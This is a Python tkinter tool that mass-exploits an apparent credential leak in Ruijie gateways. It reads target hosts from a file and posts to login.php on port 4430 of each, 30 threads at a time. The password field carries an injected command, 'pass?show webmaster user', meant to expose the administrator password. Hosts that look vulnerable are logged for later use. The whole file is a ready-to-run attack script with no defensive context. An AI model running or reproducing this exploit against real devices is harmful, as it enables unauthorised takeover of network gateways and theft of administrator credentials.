import requests
import tkinter as tk
from tkinter import scrolledtext
from tkinter import *
from PIL.ImageTk import PhotoImage
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def ruijie_admin_passwd_leak_exp(url):
    newurl = "http://" + str(url) + ":4430/login.php"
    data = {'username': 'admin',
            'password': 'pass?show webmaster user'}
    try:
        res = requests.post(newurl,data=data, verify=False, timeout=3)
        if "data" in res.text and "Unrecognized host or address." not in res.text:
            ruijie_admin_passwd_leak_text.insert(END,"----------------------------------\n[! ! ! ! ! ! ] Vulnerable url:" + newurl + "\n----------------------------------\n")
            ruijie_admin_passwd_leak_text.see(END)
            with open ("[exists]ruijie_admin_passwd_leak_url.txt", 'a') as f:
                f.write(newurl + "\n")
        else:
            ruijie_admin_passwd_leak_text.insert(END,"[×]URL without vulnerability:" + newurl + "\n")
            ruijie_admin_passwd_leak_text.see(END)
    except Exception as err:
        ruijie_admin_passwd_leak_text.insert(END, "[×]The target request failed, and the error content:" + str(err) + "\n")
        ruijie_admin_passwd_leak_text.see(END)
def get_ruijie_admin_passwd_leak_addr():
    with open("host.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def ruijie_admin_passwd_leak_gui():
    ruijie_admin_passwd_leak = Toplevel()
    ruijie_admin_passwd_leak.geometry("1035x455")
    ruijie_admin_passwd_leak.title("Ruijie Gateway administrator account password leaked [auto-muti-exp]")
    ruijie_admin_passwd_leak.resizable(0, 0)
    logo = PhotoImage(file="./logo.ico")
    ruijie_admin_passwd_leak.tk.call('wm', 'iconphoto', ruijie_admin_passwd_leak._w, logo)
    global ruijie_admin_passwd_leak_text
    ruijie_admin_passwd_leak_text = scrolledtext.ScrolledText(ruijie_admin_passwd_leak,width=123, height=25)
    ruijie_admin_passwd_leak_text.grid(row=0, column=0, padx=10, pady=10)
    ruijie_admin_passwd_leak_text.see(END)
    addrs = get_ruijie_admin_passwd_leak_addr()
    max_thread_num = 30
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(ruijie_admin_passwd_leak_exp, addr)
    ruijie_admin_passwd_leak.mainloop()